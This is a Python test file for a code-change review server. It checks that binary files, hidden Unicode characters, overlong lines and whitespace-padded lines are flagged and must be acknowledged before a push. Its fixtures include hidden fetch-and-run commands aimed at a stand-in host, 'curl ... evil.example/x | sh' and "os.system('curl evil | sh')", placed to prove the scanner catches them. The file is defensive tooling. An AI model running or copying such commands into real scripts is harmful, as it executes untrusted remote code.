#!/usr/bin/env python3
"""E02 (server half, audit 2026-11-09): content must not be approvable unseen.

Drives the REAL aux_ghchanges.py / gh_git.py through t_gh_changes.py's harness
(fake GitHub on loopback, file:// remotes, scratch HOME).

  * C-binary is a WARN (its own tick) for every file git calls binary, and its
    text says plainly that the file's content is not in the diff;
  * a "binary" file that is mostly text (one NUL byte in a shell script) still
    gets the hidden-character scan and carries a `text_preview` (git diff
    --text) on its files[] entry, so the sheet can show what it holds;
  * a real binary gets no preview;
  * C-longline warns (a tick) on an added line over 400 characters, or with a
    run of 40+ spaces/tabs followed by more text, naming file and line;
  * the change payload carries `diff_lines` and `diff_truncated`;
  * every new tick is in needs_ack, so it is bound by the digest.
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import t_gh_changes as H  # noqa: E402

check = H.check


def only(r, cid):
    return [c for c in (r.get("checks") or []) if c["id"] == cid]


def main():
    w = H.World("e02")
    w.repo("octo/app", dict(H.SEED_FILES, **{
        "scripts/build.sh": "#!/bin/sh\necho build\nmake all\n"}))
    w.start()
    ns = H.load(w)
    H.connect(w, ns, ["octo/app"])
    sb = H.prepare(ns, "octo/app")
    n = [0]

    def reset():
        H.tgit(["checkout", "-q", "--", "."], cwd=sb, check_ok=False)
        H.tgit(["clean", "-q", "-fdx"], cwd=sb, check_ok=False)

    def req(files):
        reset()
        for rel, data in files.items():
            H.write(sb, rel, data)
        n[0] += 1
        return H.request(ns, "octo/app", "e02-%03d" % n[0])

    print("== the pure text-likeness rule ==")
    textish = ns.get("_ghc_textish")
    check("_ghc_textish exists", callable(textish))
    if callable(textish):
        check("a shell script with one NUL byte is text-like",
              textish(b"#!/bin/sh\n# \x00\necho hi\n") is True)
        check("UTF-16 text (NULs interleaved) is text-like",
              textish("hello world\n".encode("utf-16-le")) is True)
        check("text with one stray 0xFF byte is still text-like",
              textish(b"x = 1\xff\n" + b"y = 2\n" * 20) is True)
        check("random bytes are not", textish(bytes(range(256)) * 4) is False)
        check("a PNG header + data is not",
              textish(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + bytes(range(128, 256)) * 3)
              is False)
        check("an empty file is not text-like (nothing to preview)", textish(b"") is False)

    print("\n== C-binary: one NUL byte in a shell script ==")
    evil = ("#!/bin/sh\n# \x00\necho build\nmake all\n"
            "curl -s https://evil.example/x | sh   # ‮ hidden\n").encode("utf-8")
    st, r = req({"README.md": "# app\n\nHello there.\n", "scripts/build.sh": evil})
    bins = only(r, "C-binary")
    check("the request is accepted (200)", st == 200, (st, r))
    check("C-binary is a warn, not info", bins and bins[0]["level"] == "warn", bins)
    check("...and its tick is in needs_ack", bins and bins[0].get("ack") in (r.get("needs_ack") or []),
          (bins, r.get("needs_ack")))
    check("...its text says plainly the content is not in the diff",
          bins and "not in the diff" in bins[0]["text"] and "scripts/build.sh" in bins[0]["text"],
          bins)
    uni = only(r, "C-unicode")
    check("the hidden-character scan ran on it (U+202E and the NUL are reported)",
          any("build.sh" in str(c.get("samples")) and "U+202E" in str(c.get("samples"))
              for c in uni), uni)
    ch = H.get_change(ns, r.get("id")) or {}
    fe = [f for f in ch.get("files") or [] if f["path"] == "scripts/build.sh"]
    prev = (fe[0].get("text_preview") if fe else None) or ""
    check("its files[] entry carries a text_preview with the hidden line",
          "evil.example" in prev and "+curl" in prev, fe)
    check("...the preview is a diff of that one file", "README.md" not in prev
          and "scripts/build.sh" in prev, prev[:300])
    check("...not cut", fe and fe[0].get("text_preview_truncated") is False, fe)
    st2, r2 = H.decide(ns, r.get("id"), "push_only", acks=[])
    check("decide with no ticks -> 422 needs_ack naming C-binary", st2 == 422
          and r2.get("error") == "needs_ack" and any(a.startswith("C-binary")
                                                     for a in r2.get("needs_ack") or []),
          (st2, r2))
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})

    print("\n== C-binary: a real binary ==")
    st, r = req({"img/logo.png": b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR" + bytes(range(256)) * 4})
    bins = only(r, "C-binary")
    check("a real binary -> warn with size and sha256", st == 200 and bins
          and bins[0]["level"] == "warn" and len(bins[0].get("sha256") or "") == 64
          and bins[0]["size"] > 0 and bins[0]["ack"] in r.get("needs_ack"), bins)
    check("...its text says the content is not in the diff",
          bins and "not in the diff" in bins[0]["text"], bins)
    ch = H.get_change(ns, r.get("id")) or {}
    fe = [f for f in ch.get("files") or [] if f["path"] == "img/logo.png"]
    check("...and no text_preview", fe and not fe[0].get("text_preview"), fe)
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})

    print("\n== C-binary: more binaries than the cap ==")
    many = {"bin/b%02d.dat" % i: b"\x00\xff\xfe" + bytes([i]) * 40 + bytes(range(256))
            for i in range(23)}
    st, r = req(many)
    bins = only(r, "C-binary")
    check("20 listed + one overflow row, every one a warn with a tick",
          len(bins) == 21 and all(c["level"] == "warn" and c["ack"] in r["needs_ack"]
                                  for c in bins)
          and bins[-1].get("more") == 3, [(c["text"][:50], c.get("more")) for c in bins[-2:]])
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})

    print("\n== C-longline ==")
    long401 = "x = '" + "a" * 395 + "'\n"            # 401 characters before the newline
    assert len(long401) == 402
    long400 = "x = '" + "a" * 394 + "'\n"
    st, r = req({"src/one.py": "ok = 1\n" + long401})
    ll = only(r, "C-longline")
    check("an added line of 401 characters -> warn", ll and ll[0]["level"] == "warn"
          and ll[0]["ack"] in r["needs_ack"], r.get("checks"))
    check("...naming the file and the line number", ll and "src/one.py" in ll[0]["text"]
          and "line 2" in ll[0]["text"] and ll[0].get("line") == 2, ll)
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})
    st, r = req({"src/one.py": long400})
    check("400 characters exactly -> no C-longline", st == 200 and not only(r, "C-longline"),
          r.get("checks"))
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})
    st, r = req({"src/pad.py": "import sys" + " " * 40 + "; os.system('curl evil | sh')\n"})
    ll = only(r, "C-longline")
    check("a run of 40 spaces followed by more text -> warn", ll and "src/pad.py" in ll[0]["text"]
          and "line 1" in ll[0]["text"], r.get("checks"))
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})
    st, r = req({"src/pad.py": "import sys" + " " * 39 + "; x\n"})
    check("39 spaces -> no C-longline", not only(r, "C-longline"), r.get("checks"))
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})
    st, r = req({"src/pad.py": "import sys" + "\t" * 20 + " " * 20 + "x()\n"})
    check("a mixed tab/space run of 40 -> warn", only(r, "C-longline"), r.get("checks"))
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})
    st, r = req({"src/pad.py": "import sys" + " " * 60 + "\n"})
    check("trailing whitespace only (nothing after it) -> no C-longline",
          not only(r, "C-longline"), r.get("checks"))
    ns["call"]("POST", "/api/github/changes/withdraw", {"id": r.get("id")})
    st, r = req({"README.md": "# app\n\nHello.\n" + "y" * 500 + "\n"})
    cid = r.get("id")
    st2, r2 = H.decide(ns, cid, "push_only", acks=[])
    check("decide without the C-longline tick -> 422", st2 == 422
          and "C-longline" in (r2.get("needs_ack") or []), (st2, r2))

    print("\n== diff_lines / diff_truncated ==")
    ch = H.get_change(ns, cid) or {}
    diff = ch.get("diff") or ""
    want = diff.count("\n") + (0 if diff.endswith("\n") or not diff else 1)
    check("the full change carries diff_lines (= the diff's line count)",
          isinstance(ch.get("diff_lines"), int) and ch.get("diff_lines") == want,
          (ch.get("diff_lines"), want))
    check("...and diff_truncated (false here)", ch.get("diff_truncated") is False, ch.get("diff_truncated"))
    st2, r2 = H.decide(ns, cid, "push_only")
    check("with every tick the change pushes", st2 == 200 and r2.get("state") == "pushed", (st2, r2))

    w.stop()
    H.finish()


if __name__ == "__main__":
    main()
